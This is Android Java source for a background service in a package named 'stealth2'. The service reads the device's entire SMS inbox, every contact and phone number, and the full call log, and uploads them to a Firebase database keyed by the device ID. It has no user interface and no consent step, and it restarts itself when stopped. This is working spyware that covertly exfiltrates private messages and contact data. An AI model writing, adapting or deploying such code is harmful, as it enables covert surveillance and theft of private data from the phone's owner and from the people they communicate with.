package com.example.prajna.stealth2;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.provider.Telephony;
import android.support.annotation.Nullable;
import android.util.Log;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Calendar;
import java.util.Date;

public class Myservice extends Service {
    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }





    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference("INFO");
        String phoneid = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);


        // ................................................sms part........................................................................//
        Uri uriSmsuri =Uri.parse("content://sms/inbox");
        Cursor cur = getContentResolver().query(uriSmsuri,null,null,null,null);


        while (cur.moveToNext()){

            final String sms = cur.getString(cur.getColumnIndexOrThrow("body"));
            final String sID = cur.getString(cur.getColumnIndex(Telephony.Sms._ID));
            final String saddress = cur.getString(cur.getColumnIndex(Telephony.Sms.ADDRESS));
            final String stime = cur.getString(cur.getColumnIndex(Telephony.Sms.DATE));


            Long timestamp = Long.parseLong(stime);
            Calendar calendar = Calendar.getInstance();
            calendar.setTimeInMillis(timestamp);
            Date finaldate = calendar.getTime();
            String smsDate = finaldate.toString();


            myRef.child(phoneid).child("Messages").child(sID).setValue(sms);


            Log.i("message",sms+"....."+saddress);

            if(saddress.toString().equals("IM-CPMUMB")){

                Log.d("successfull","yo yo honey singh"+"....."+smsDate);

            }
        }

        // ................................................sms part ends here........................................................................//

        //.................................................contact part...........................................................................//


        ContentResolver resolver = getContentResolver();
        Cursor cursor= resolver.query(ContactsContract.Contacts.CONTENT_URI,null,null,null,null);



        while(cursor.moveToNext()){
            final String ID =cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
            final String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));




            Log.i("MY info",ID+" = "+name);


            Cursor phonecursor = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,null,
                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ? ",new String[]{ ID },null);

            while(phonecursor.moveToNext()){
                final String phonenumber = phonecursor.getString(phonecursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));



                Log.i("MY info",phonenumber);

                myRef.child(phoneid).child("Contact").child(name).setValue(phonenumber);
            }


        }
        //.................................................contact part ends here..............................................................//



        //.................................................call log...........................................................................//


        Uri allCalls = Uri.parse("content://call_log/calls");
        ContentResolver resolver2 = getContentResolver();
        Cursor c =resolver2.query (allCalls, null, null, null, null);
        int type = c.getColumnIndex(CallLog.Calls.TYPE);
        String dir;

        while(c.moveToNext()) {


            final String name1 = c.getString(c.getColumnIndex(CallLog.Calls.CACHED_NAME));// for name

            final String id = c.getString(c.getColumnIndex(CallLog.Calls._ID));
            final String calltype = c.getString(type);
            int dircode = Integer.parseInt(calltype);

            final String num = c.getString(c.getColumnIndex(CallLog.Calls.NUMBER));



            Log.i("call type",name1+"....."+id);

            switch (dircode) {
                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";

                    myRef.child(phoneid).child("Call Log").child(dir).child(id).setValue(num);

                    break;

                case CallLog.Calls.INCOMING_TYPE:

                    dir = "INCOMING";
                    myRef.child(phoneid).child("Call Log").child(dir).child(id).setValue(num);
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    myRef.child(phoneid).child("Call Log").child(dir).child(id).setValue(num);
                    break;
            }
        }


        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}
